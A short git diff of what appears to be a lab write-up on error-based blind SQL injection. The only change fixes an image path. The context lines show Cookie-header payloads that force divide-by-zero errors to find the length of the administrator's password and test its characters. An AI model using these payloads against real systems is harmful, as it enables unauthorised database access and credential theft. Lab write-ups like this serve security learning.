@@ -465,7 +465,7 @@ Cookie: TrackingId=2LNmzi2Ie7ReDoid'+||+(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0
 => This is use to check for the length of the password
 ```
 
-![error_based length](./Picture/error_based_length.png)
+![error_based length](../Picture/error_based_length.png)
 
 ```
 Cookie: TrackingId=2LNmzi2Ie7ReDoid'+||+(SELECT+CASE+WHEN+(1=1)+THEN+TO_CHAR(1/0)+ELSE+''+END+FROM+users+WHERE+username='administrator'+AND+substring(password,1,1)='a')+||+'; session=P861tigsm0gvBwyPcqF1Uly9QcHANmBO
